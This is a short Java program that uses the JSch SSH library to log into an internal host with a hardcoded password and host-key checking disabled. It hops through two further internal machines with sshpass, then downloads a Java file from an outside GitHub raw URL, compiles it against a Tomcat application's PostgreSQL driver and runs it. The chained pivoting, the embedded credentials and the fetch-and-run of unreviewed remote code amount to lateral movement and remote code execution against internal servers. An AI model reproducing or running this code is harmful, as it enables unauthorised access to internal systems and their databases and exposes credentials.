import com.jcraft.jsch.*;
import java.io.*;
class DKXF2 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"cd /tmp && curl -sL -o XF2.java https://raw.githubusercontent.com/bimhybim-del/ai/main/XF2.java && /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar XF2.java 2>&1 && /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/postgresql-42.3.3.jar:. XF2 2>&1\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
